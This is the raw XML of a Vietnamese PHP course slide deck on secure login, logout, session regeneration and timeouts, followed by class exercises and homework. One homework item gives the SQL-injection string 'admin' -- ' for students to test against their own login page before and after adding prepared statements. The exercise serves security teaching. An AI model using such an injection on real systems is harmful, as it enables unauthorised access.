              <a:rPr sz="2000" b="0"/>
              <a:t>, đổi ID sau khi login, ghi mốc thời gian, báo khi phiên hết hạn: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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (18/24)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755648"/>
            <a:ext cx="8412480" cy="4358640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&lt;?php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// File: login.php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require_once "app/common/sessionConfig.php";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require_once "app/common/dbConnect.php";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require_once "app/common/commonFuncs.php";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$thongBaoLoi = "";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if (isset($_GET["timeout"]))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$thongBaoLoi = "Phiên đăng nhập đã hết hạn, vui lòng đăng nhập lại";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if ($_SERVER["REQUEST_METHOD"] === "POST")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$username = trim($_POST["username"] ?? "");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$password = $_POST["password"] ?? "";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$nhoToi   = isset($_POST["remember"]);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if ($username === "" || $password === "")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$thongBaoLoi = "Yêu cầu nhập đủ tên đăng nhập và mật khẩu";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} else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$user = truyVanMotDong($conn,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    "SELECT * FROM user WHERE username = :username",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    ["username" =&gt; $username]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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (19/24)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755648"/>
            <a:ext cx="8412480" cy="4358640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if ($user &amp;&amp; password_verify($password, $user["password"]))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    session_regenerate_id(true);   // ID moi, xoa file session cu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    $_SESSION["user_id"]       = $user["id"];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    $_SESSION["username"]      = $user["username"];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    $_SESSION["fullname"]      = $user["fullname"];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    $_SESSION["is_admin"]      = (int)$user["is_admin"];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    $_SESSION["login_time"]    = time();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    $_SESSION["last_activity"] = time();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    if ($nhoToi)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                // Chi nho TEN dang nhap, khong cap quyen gi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        setcookie("remember_user", $user["username"], [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            "expires"  =&gt; time() + 7 * 86400,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            "path"     =&gt; "/",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            "httponly" =&gt; true,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            "samesite" =&gt; "Lax",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        ]);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  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    header("Location: index.php");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    exit();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} else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    $thongBaoLoi = "Tên đăng nhập hoặc mật khẩu không đúng";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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (20/24)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755648"/>
            <a:ext cx="8412480" cy="4358640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$pageTitle = "Đăng nhập";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include "app/view/header.php";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?&gt;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&lt;h2&gt;Đăng nhập&lt;/h2&gt;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&lt;?php if ($thongBaoLoi !== ""): ?&gt;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&lt;p style="color:red"&gt;&lt;?= anToan($thongBaoLoi) ?&gt;&lt;/p&gt;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&lt;?php endif; ?&gt;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&lt;form method="post"&gt;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&lt;p&gt;Tên đăng nhập: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&lt;input type="text" name="username"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   value="&lt;?= anToan($_COOKIE["remember_user"] ?? "") ?&gt;"&gt;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&lt;/p&gt;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&lt;p&gt;Mật khẩu: &lt;input type="password" name="password"&gt;&lt;/p&gt;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&lt;p&gt;&lt;label&gt;&lt;input type="checkbox" name="remember"&gt; Ghi nhớ tên đăng nhập&lt;/label&gt;&lt;/p&gt;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&lt;p&gt;&lt;button type="submit"&gt;Đăng nhập&lt;/button&gt;&lt;/p&gt;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&lt;/form&gt;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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (21/24)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755648"/>
            <a:ext cx="8412480" cy="731520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&lt;?php include "app/view/footer.php"; ?&gt;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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (22/24)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755648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/>
              <a:t>`logout.php` bản hoàn chỉnh:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t> hủy dữ liệu trên server </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="1"/>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t> xóa cookie chứa ID ở trình duyệt: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231136"/>
            <a:ext cx="8412480" cy="4306824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&lt;?php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// File: logout.php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require_once "app/common/sessionConfig.php";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// 1. Xoa du lieu trong bien $_SESSION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$_SESSION = [];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// 2. Xoa cookie chua Session ID o trinh duyet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//    (phai dung dung path/domain da dung luc tao cookie)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$p = session_get_cookie_params();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setcookie(session_name(), "", [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"expires"  =&gt; time() - 3600,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"path"     =&gt; $p["path"],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"domain"   =&gt; $p["domain"],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"secure"   =&gt; $p["secure"],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"httponly" =&gt; $p["httponly"],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"samesite" =&gt; $p["samesite"],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]);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// 3. Huy file session tren server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session_destroy();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// Xoa cookie "nho ten dang nhap"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setcookie("remember_user", "", time() - 3600, "/");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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (23/24)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755648"/>
            <a:ext cx="8412480" cy="1227328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header("Location: login.php");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exit();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?&gt;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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (24/24)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1800" b="0"/>
              <a:t>Thứ tự 1 → 2 → 3 quan trọng: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>session_destroy()</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>không</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> xóa cookie ở trình duyệt và </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>không</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> làm trống </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>$_SESSION</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> đang có trong request hiện tại, nên phải tự làm hai việc đó.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>Thử nghiệm:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> tạm đặt </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>SESSION_IDLE_TIMEOUT</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> = 20 giây, đăng nhập, chờ 25 giây rồi F5 → bị đẩy về trang đăng nhập. Mở DevTools xem </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>PHPSESSID</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> trước và sau đăng nhập: giá trị phải </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>khác nhau</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t>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3. Thực hành tại lớp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1400" b="1"/>
              <a:t>Practice 1 — `buoi5_practice1.php`</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t> Form đăng ký gồm: họ tên, email, mật khẩu, xác nhận mật khẩu, ngày sinh, giới tính (radio), sở thích (checkbox nhiều lựa chọn). Validate đủ: bắt buộc nhập, email đúng định dạng, mật khẩu tối thiểu 6 ký tự, hai lần nhập mật khẩu phải khớp. Lỗi hiện chữ đỏ "(Yêu cầu nhập)" cạnh ô sai.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="1"/>
              <a:t>Practice 2 — Bài trắc nghiệm 2 trang</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>Trang 1: 5 câu hỏi, mỗi câu 4 đáp án (radio). Bấm "Tiếp" → lưu đáp án vào </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1"/>
              <a:t>Session</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>Trang 2: 5 câu khác. Bấm "Nộp bài" → sang trang 3.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>Trang 3: định nghĩa hằng số mảng đáp án đúng, chấm điểm trên thang 10 và xếp loại:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt; 4</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>: "Cần cố gắng thêm" · </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>4–7</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>: "Đạt yêu cầu" · </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt; 7</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>: "Rất tốt".</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="1"/>
              <a:t>Practice 3 — Đăng nhập cho dự án</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t> Hoàn thiện </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>login.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>logout.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>register.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>checkLogin.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>. Yêu cầu:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>Mật khẩu lưu dạng hash.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>Trang </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>product_add/edit/delete.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t> chỉ admin vào được.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0"/>
              <a:t>Header hiển thị "Xin chào [tên] | Đăng xuất" khi đã đăng nhập, ngược lại hiện link "Đăng nhập".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4. Bài tập về nhà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600" b="0"/>
              <a:t>Hoàn thiện 3 practice trên.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>Thử tấn công chính trang login của mình bằng chuỗi </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>admin' -- </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> — trước và sau khi dùng</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>prepared statement. Chụp màn hình cả hai trường hợp và giải thích.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>Thêm giỏ hàng đơn giản lưu bằng Session: nút "Thêm vào giỏ" ở danh sách sản phẩm, trang</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>cart.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> hiển thị các sản phẩm đã chọn, số lượng, tổng tiền và nút xóa từng dòng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>Đọc trước Vue: https://www.w3schools.com/vue/ (mục Vue Intro và Vue Directives).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5. Checklist cuối buổi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600" b="0"/>
              <a:t>[ ] Biết khi nào dùng GET, khi nào dùng POST.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>[ ] Validate được form phía server, giữ lại dữ liệu đã nhập khi báo lỗi.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>[ ] Phân biệt Session và Cookie, biết cái nào lưu quyền hạn.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>[ ] Đăng nhập / đăng xuất / chặn trang admin chạy đúng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>[ ] Mật khẩu trong CSDL đã ở dạng hash, không còn chữ thô.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>[ ] Giải thích được SQL Injection và XSS bằng ví dụ tự làm.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>[ ] Giải thích được vì sao phải gọi </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>session_regenerate_id(true)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> sau khi đăng nhập (session fixation).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>[ ] Phân biệt idle timeout và absolute timeout; biết timeout cookie không đáng tin, server phải tự kiểm tra.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6. Tham khảo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2000" b="0"/>
              <a:t>Form PHP: https://www.w3schools.com/php/php_forms.asp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>Session: https://www.php.net/manual/en/book.session.php</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>password_hash</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>: https://www.php.net/manual/en/function.password-hash.php</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>OWASP Top 10: https://owasp.org/www-project-top-ten/</a:t>
            </a:r>
          </a:p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ency">
  <a:themeElements>
    <a:clrScheme name="Adjacency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6880</TotalTime>
  <Words>328</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>画面に合わせる (4:3)</PresentationFormat>
  <Paragraphs>57</Paragraphs>
  <Slides>19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19</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="24" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Cambria</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Adjacency</vt:lpstr>
      <vt:lpstr>Khóa đào tạo Lập trình Web sử dụng PHP</vt:lpstr>
      <vt:lpstr>PowerPoint プレゼンテーション</vt:lpstr>
      <vt:lpstr>1. Form</vt:lpstr>
      <vt:lpstr>Các loại HTML input cơ bản</vt:lpstr>
      <vt:lpstr>Demo</vt:lpstr>
      <vt:lpstr>2. Truyền biến</vt:lpstr>
      <vt:lpstr>demo11.html – Page A - GET</vt:lpstr>
      <vt:lpstr>demo 11d.php - GET</vt:lpstr>
      <vt:lpstr>demo11.html – Page A - POST</vt:lpstr>
      <vt:lpstr>demo11.php – Page B - POST</vt:lpstr>
      <vt:lpstr>Self-handling</vt:lpstr>
      <vt:lpstr>Output</vt:lpstr>
      <vt:lpstr>Output</vt:lpstr>
      <vt:lpstr>Demo 3 – Dung Hidden</vt:lpstr>
      <vt:lpstr>Demo 3 – Page A</vt:lpstr>
      <vt:lpstr>Demo 3 – Page B</vt:lpstr>
      <vt:lpstr>Demo 3 – Page C - POST</vt:lpstr>
      <vt:lpstr>Practice 1</vt:lpstr>
      <vt:lpstr>Practice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Khóa đào tạo lập trình web sử dụng php</dc:title>
  <dc:creator>ngoctb</dc:creator>
  <cp:lastModifiedBy>Chu Van Quy</cp:lastModifiedBy>
  <cp:revision>2090</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2014-12-22T07:12:12Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-09-30T00:54:03Z</dcterms:modified>
</cp:coreProperties>
</file>